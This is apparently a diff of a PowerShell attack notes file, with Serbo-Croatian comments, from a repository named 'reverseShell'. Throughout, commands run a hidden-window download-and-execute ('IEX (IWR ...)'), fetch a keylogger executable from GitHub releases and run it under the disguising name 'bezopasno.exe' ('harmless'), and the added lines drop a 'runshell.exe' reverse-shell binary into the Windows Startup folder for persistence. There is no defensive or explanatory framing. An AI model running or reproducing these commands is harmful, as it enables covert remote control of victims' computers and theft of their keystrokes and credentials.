@@ -7,7 +7,8 @@ powershell -WindowStyle Hidden -Command "IEX (IWR https://raw.githubusercontent.
 Invoke-WebRequest -Uri "https://github.com/Jango47/reverseShell/releases/download/keylogger/keylogger.exe" -OutFile "$env:LOCALAPPDATA\bezopasno.exe"
 & "$env:LOCALAPPDATA\bezopasno.exe"
 
---- SKIDANJE I POKRETANJE KEYLOGGERA NA STARTUPU (MORA BITI ADMIN) ---
 
-Invoke-WebRequest -Uri "https://github.com/Jango47/reverseShell/releases/download/keylogger/keylogger.exe" -OutFile "$env:LOCALAPPDATA\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bezopasno.exe"
-& "$env:LOCALAPPDATA\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bezopasno.exe"
+
+https://github.com/Jango47/reverseShell/releases/download/runshell/runshell.exe
+Invoke-WebRequest -Uri "https://github.com/Jango47/reverseShell/releases/download/runshell/runshell.exe" -OutFile "$env:LOCALAPPDATA\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bezopasnishell.exe"
+
